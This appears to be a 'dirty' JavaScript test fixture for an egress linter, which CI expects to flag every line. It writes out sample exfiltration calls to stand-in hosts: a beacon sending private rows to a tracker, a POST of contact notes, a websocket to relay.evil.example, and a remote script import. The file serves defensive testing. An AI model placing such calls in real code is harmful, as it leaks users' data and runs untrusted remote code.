// Dirty fixture: unsanctioned egress vectors to non-allow-listed remote origins.
// CI asserts egress-lint exits 1 and flags each of these. There is no
// egress-allow.json here, so every remote origin is a violation.

// Private data exfiltrated to a third-party analytics host.
navigator.sendBeacon("https://analytics.tracker.example/collect", JSON.stringify(privateRows));

// Cross-origin POST of contact data.
await fetch("https://api.thirdparty.example/sync", { method: "POST", body: notes });

// Remote websocket.
const ws = new WebSocket("wss://relay.evil.example/socket");

// Protocol-relative remote script load.
await import("//cdn.somewhere.example/lib.js");
